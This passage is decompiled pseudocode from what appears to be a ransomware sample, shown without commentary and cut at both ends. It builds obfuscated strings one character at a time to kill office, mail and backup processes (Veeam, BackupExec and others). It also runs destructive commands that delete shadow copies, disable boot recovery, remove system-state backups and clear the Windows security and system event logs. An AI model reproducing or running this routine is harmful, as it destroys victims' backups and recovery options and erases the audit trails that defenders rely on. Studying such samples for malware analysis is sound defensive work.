= 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6f);\n    uVar17 = 0x74;\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x6f);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6f);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6b);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x70);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x77);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x70);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(0x6d);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x74);\n    fcn.00401120(0x68);\n    fcn.00401120(0x65);\n    fcn.00401120(0x62);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x74);\n    fcn.00401120(0x68);\n    fcn.00401120(0x75);\n    fcn.00401120(0x6e);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x62);\n    fcn.00401120(0x69);\n    uVar17 = 0x72;\n    fcn.00401120(0x72);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xb);\n    puVar7 = fcn.00401010(0xb);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    fcn.00401120(0x73);\n    uVar17 = 0x69;\n    fcn.00401120(0x69);\n    fcn.00401120(0x6f);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x77);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(100);\n    fcn.00401120(0x70);\n    uVar17 = 0x61;\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(100);\n    uVar17 = 0x62;\n    fcn.00401120(0x62);\n    fcn.00401120(0x68);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x76);\n    fcn.00401120(0x78);\n    fcn.00401120(0x6d);\n    uVar17 = 0x6f;\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 5);\n    puVar7 = fcn.00401010(5);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x67);\n    fcn.00401120(0x69);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 7);\n    puVar7 = fcn.00401010(7);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x70);\n    fcn.00401120(0x76);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x73);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 6);\n    puVar7 = fcn.00401010(6);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x62);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    uVar17 = 0x65;\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x72);\n    fcn.00401120(0x61);\n    fcn.00401120(0x77);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x61);\n    fcn.00401120(0x67);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    fcn.00401120(0x5f);\n    fcn.00401120(0x73);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0xd);\n    puVar7 = fcn.00401010(0xd);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x76);\n    fcn.00401120(0x73);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x61);\n    fcn.00401120(0x70);\n    fcn.00401120(0x76);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 8);\n    puVar7 = fcn.00401010(8);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x43);\n    fcn.00401120(0x61);\n    fcn.00401120(0x67);\n    fcn.00401120(0x53);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x76);\n    fcn.00401120(0x69);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 10);\n    puVar7 = fcn.00401010(10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x44);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x53);\n    fcn.00401120(0x79);\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x44);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    uVar17 = 99;\n    fcn.00401120(99);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x10);\n    puVar7 = fcn.00401010(0x10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x45);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x70);\n    fcn.00401120(0x72);\n    fcn.00401120(0x69);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x43);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x69);\n    fcn.00401120(0x65);\n    uVar17 = 0x6e;\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x10);\n    puVar7 = fcn.00401010(0x10);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x56);\n    fcn.00401120(0x65);\n    fcn.00401120(0x65);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x44);\n    fcn.00401120(0x65);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x79);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    fcn.00401120(0x53);\n    uVar17 = 0x76;\n    fcn.00401120(0x76);\n    fcn.00401120(99);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        arg_8h_00 = uVar12;\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x12);\n    puVar7 = fcn.00401010(0x12);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.0040cc00(&stack0x0000000c, 0, 0x124);\n    (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)();\n    (*_sym.imp.KERNEL32.dll_Process32First)();\n    do {\n        iVar8 = fcn.0040cd50();\n        fcn.0040cbe0(&stack0x00000120, &stack0x0000001c, iVar8 + 1);\n        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionA)();\n        uVar12 = 0;\n        do {\n            uVar9 = uVar12 * 4;\n            iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)();\n            if ((iVar8 == 0) && (iVar8 = fcn.0041a160(),  iVar8 != 0)) {\n                fcn.00401120(0x4b);\n                fcn.00401120(0x69);\n                fcn.00401120(0x6c);\n                fcn.00401120(0x6c);\n                fcn.00401120(0x65);\n                fcn.00401120(100);\n                fcn.00401120(0x20);\n                fcn.00401120(0x70);\n                fcn.00401120(0x72);\n                fcn.00401120(0x6f);\n                fcn.00401120(99);\n                fcn.00401120(0x65);\n                fcn.00401120(0x73);\n                fcn.00401120(0x73);\n                fcn.00401120(0x3a);\n                fcn.00401120(0x20);\n                fcn.00401120(0x25);\n                fcn.00401120(0x73);\n                fcn.00401120(0x20);\n                fcn.00401120(0x5b);\n                fcn.00401120(0x70);\n                fcn.00401120(0x69);\n                fcn.00401120(100);\n                fcn.00401120(0x3a);\n                fcn.00401120(0x20);\n                fcn.00401120(0x25);\n                fcn.00401120(0x6c);\n                fcn.00401120(100);\n                fcn.00401120(0x5d);\n                arg_8h = 0;\n                do {\n                    uVar12 = arg_8h;\n                    puVar10 = fcn.00401010(arg_8h);\n                    uVar9 = puVar10 & 0xffffff00 | *puVar10;\n                    puVar7 = fcn.00401010(arg_8h);\n                    uVar1 = fcn.00401120(arg_8h_00);\n                    arg_8h = arg_8h + 1;\n                    *puVar7 = uVar1;\n                } while (arg_8h < 0x1d);\n                puVar7 = fcn.00401010(0x1d);\n                *puVar7 = 0;\n                uVar17 = fcn.00401000();\n                fcn.0040a0b0(uVar17, &stack0x00000018);\n            }\n            uVar12 = uVar12 + 1;\n        } while (*(&stack0xfffffce8 + uVar9) != 0);\n        iVar8 = (*_sym.imp.KERNEL32.dll_Process32Next)();\n    } while (iVar8 != 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    if (CONCAT22(extraout_var, in_GS) != 0) {\n        fcn.00401120(0x57);\n        fcn.00401120(0x6f);\n        fcn.00401120(0x77);\n        fcn.00401120(0x36);\n        fcn.00401120(0x34);\n        fcn.00401120(0x44);\n        fcn.00401120(0x69);\n        fcn.00401120(0x73);\n        fcn.00401120(0x61);\n        fcn.00401120(0x62);\n        fcn.00401120(0x6c);\n        fcn.00401120(0x65);\n        fcn.00401120(0x57);\n        fcn.00401120(0x6f);\n        fcn.00401120(0x77);\n        fcn.00401120(0x36);\n        fcn.00401120(0x34);\n        fcn.00401120(0x46);\n        fcn.00401120(0x73);\n        fcn.00401120(0x52);\n        fcn.00401120(0x65);\n        fcn.00401120(100);\n        fcn.00401120(0x69);\n        fcn.00401120(0x72);\n        fcn.00401120(0x65);\n        fcn.00401120(99);\n        uVar17 = 0x74;\n        fcn.00401120(0x74);\n        fcn.00401120(0x69);\n        fcn.00401120(0x6f);\n        fcn.00401120(0x6e);\n        uVar12 = 0;\n        do {\n            fcn.00401010(uVar12);\n            puVar7 = fcn.00401010(uVar12);\n            uVar1 = fcn.00401120(uVar17);\n            uVar12 = uVar12 + 1;\n            *puVar7 = uVar1;\n        } while (uVar12 < 0x1e);\n        puVar7 = fcn.00401010(0x1e);\n        *puVar7 = 0;\n        fcn.00401000();\n        fcn.00401120(0x6b);\n        fcn.00401120(0x65);\n        fcn.00401120(0x72);\n        fcn.00401120(0x6e);\n        uVar17 = 0x65;\n        fcn.00401120(0x65);\n        fcn.00401120(0x6c);\n        fcn.00401120(0x33);\n        fcn.00401120(0x32);\n        uVar12 = 0;\n        do {\n            fcn.00401010(uVar12);\n            puVar7 = fcn.00401010(uVar12);\n            uVar1 = fcn.00401120(uVar17);\n            uVar12 = uVar12 + 1;\n            *puVar7 = uVar1;\n        } while (uVar12 < 8);\n        puVar7 = fcn.00401010(8);\n        *puVar7 = 0;\n        fcn.00401000();\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        pcVar11 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n        if (pcVar11 != NULL) {\n            (*pcVar11)();\n        }\n    }\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)();\n    fcn.0040cd60();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x76);\n    fcn.00401120(0x73);\n    fcn.00401120(0x73);\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x20);\n    fcn.00401120(0x44);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x20);\n    fcn.00401120(0x53);\n    fcn.00401120(0x68);\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x77);\n    fcn.00401120(0x73);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2f);\n    fcn.00401120(0x41);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2f);\n    fcn.00401120(0x51);\n    uVar17 = 0x75;\n    fcn.00401120(0x75);\n    fcn.00401120(0x69);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x26);\n    puVar7 = fcn.00401010(0x26);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x62);\n    fcn.00401120(99);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(100);\n    fcn.00401120(0x69);\n    fcn.00401120(0x74);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2f);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    fcn.00401120(0x20);\n    fcn.00401120(0x7b);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x66);\n    fcn.00401120(0x61);\n    fcn.00401120(0x75);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x74);\n    fcn.00401120(0x7d);\n    fcn.00401120(0x20);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(99);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x76);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x79);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x61);\n    fcn.00401120(0x62);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x65);\n    uVar17 = 100;\n    fcn.00401120(100);\n    fcn.00401120(0x20);\n    fcn.00401120(0x4e);\n    fcn.00401120(0x6f);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x2c);\n    puVar7 = fcn.00401010(0x2c);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x62);\n    fcn.00401120(99);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(100);\n    fcn.00401120(0x69);\n    fcn.00401120(0x74);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2f);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    fcn.00401120(0x20);\n    fcn.00401120(0x7b);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x66);\n    fcn.00401120(0x61);\n    fcn.00401120(0x75);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x74);\n    fcn.00401120(0x7d);\n    fcn.00401120(0x20);\n    fcn.00401120(0x62);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x74);\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    fcn.00401120(0x61);\n    fcn.00401120(0x74);\n    fcn.00401120(0x75);\n    fcn.00401120(0x73);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x69);\n    fcn.00401120(99);\n    fcn.00401120(0x79);\n    fcn.00401120(0x20);\n    fcn.00401120(0x69);\n    fcn.00401120(0x67);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(0x61);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x66);\n    fcn.00401120(0x61);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6c);\n    uVar17 = 0x75;\n    fcn.00401120(0x75);\n    fcn.00401120(0x72);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x3c);\n    puVar7 = fcn.00401010(0x3c);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x62);\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x20);\n    fcn.00401120(0x44);\n    fcn.00401120(0x45);\n    fcn.00401120(0x4c);\n    fcn.00401120(0x45);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x20);\n    fcn.00401120(0x53);\n    fcn.00401120(0x59);\n    fcn.00401120(0x53);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x4d);\n    fcn.00401120(0x53);\n    fcn.00401120(0x54);\n    fcn.00401120(0x41);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x42);\n    fcn.00401120(0x41);\n    uVar17 = 0x43;\n    fcn.00401120(0x43);\n    fcn.00401120(0x4b);\n    fcn.00401120(0x55);\n    fcn.00401120(0x50);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x23);\n    puVar7 = fcn.00401010(0x23);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x62);\n    fcn.00401120(0x61);\n    fcn.00401120(100);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x20);\n    fcn.00401120(0x44);\n    fcn.00401120(0x45);\n    fcn.00401120(0x4c);\n    fcn.00401120(0x45);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x20);\n    fcn.00401120(0x53);\n    fcn.00401120(0x59);\n    fcn.00401120(0x53);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x4d);\n    fcn.00401120(0x53);\n    fcn.00401120(0x54);\n    fcn.00401120(0x41);\n    fcn.00401120(0x54);\n    fcn.00401120(0x45);\n    fcn.00401120(0x42);\n    fcn.00401120(0x41);\n    fcn.00401120(0x43);\n    fcn.00401120(0x4b);\n    fcn.00401120(0x55);\n    fcn.00401120(0x50);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2d);\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x65);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x4f);\n    fcn.00401120(0x6c);\n    uVar17 = 100;\n    fcn.00401120(100);\n    fcn.00401120(0x65);\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x31);\n    puVar7 = fcn.00401010(0x31);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x6d);\n    fcn.00401120(0x69);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x53);\n    fcn.00401120(0x48);\n    fcn.00401120(0x41);\n    fcn.00401120(0x44);\n    fcn.00401120(0x4f);\n    fcn.00401120(0x57);\n    fcn.00401120(0x43);\n    fcn.00401120(0x4f);\n    fcn.00401120(0x50);\n    fcn.00401120(0x59);\n    fcn.00401120(0x20);\n    fcn.00401120(0x2f);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6e);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x72);\n    fcn.00401120(0x61);\n    fcn.00401120(99);\n    uVar17 = 0x74;\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x76);\n    fcn.00401120(0x65);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x21);\n    puVar7 = fcn.00401010(0x21);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x65);\n    fcn.00401120(0x76);\n    fcn.00401120(0x74);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(99);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(0x73);\n    fcn.00401120(0x65);\n    fcn.00401120(99);\n    fcn.00401120(0x75);\n    uVar17 = 0x72;\n    fcn.00401120(0x72);\n    fcn.00401120(0x69);\n    fcn.00401120(0x74);\n    fcn.00401120(0x79);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x17);\n    puVar7 = fcn.00401010(0x17);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x65);\n    fcn.00401120(0x76);\n    fcn.00401120(0x74);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(99);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(0x73);\n    fcn.00401120(0x79);\n    uVar17 = 0x73;\n    fcn.00401120(0x73);\n    fcn.00401120(0x74);\n    fcn.00401120(0x65);\n    fcn.00401120(0x6d);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x15);\n    puVar7 = fcn.00401010(0x15);\n    *puVar7 = 0;\n    fcn.00401000();\n    fcn.00401120(0x2f);\n    fcn.00401120(99);\n    fcn.00401120(0x20);\n    fcn.00401120(0x77);\n    fcn.00401120(0x65);\n    fcn.00401120(0x76);\n    fcn.00401120(0x74);\n    fcn.00401120(0x75);\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(99);\n    